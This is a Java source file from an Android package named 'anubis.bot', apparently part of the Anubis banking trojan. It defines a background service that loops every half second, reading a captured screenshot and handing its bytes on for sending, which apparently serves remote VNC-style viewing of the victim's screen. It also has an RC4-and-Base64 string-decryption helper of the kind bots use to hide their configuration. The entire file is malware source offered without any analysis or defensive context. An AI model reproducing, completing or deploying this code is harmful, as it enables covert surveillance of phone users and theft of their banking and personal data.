package anubis.bot.myapplication.API.Screenshot;

import android.app.IntentService;
import android.content.Intent;
import android.util.Base64;

import java.io.File;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class ServiceSendRequestImageVNC extends IntentService {


    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public ServiceSendRequestImageVNC() {
        super("ServiceSendRequestImageVNC");
    }
    public int intScreenshot=0;
    @Override
    protected void onHandleIntent(Intent intent) {
        UtilsClass utilsClass = new UtilsClass();
        if((utilsClass.SetRead(this,"vnc").equals("stop"))||(utilsClass.SetRead(this,"websocket").equals(""))){
            stopService(intent);
        }

        while(true){
            try {
                try {TimeUnit.MILLISECONDS.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}

                if((utilsClass.SetRead(this,"vnc").equals("stop"))||(utilsClass.SetRead(this,"websocket").equals(""))){
                    break;
                }

                File output= new File(getExternalFilesDir(null),"screenshot.jpg");
                byte[] bytes = utilsClass.loadFile(output);//(new File("/storage/emulated/0/Android/data/anubis.bot.myapplication/files/screenshot.jpg"));
                utilsClass.inputFile2(this,bytes,intScreenshot+".jpg");
                intScreenshot++;
                if(intScreenshot>=11){intScreenshot=0;}
            }catch (Exception ex){
                utilsClass.Log("error","Send screenshot");
            }
        }
        stopService(intent);
    }
}
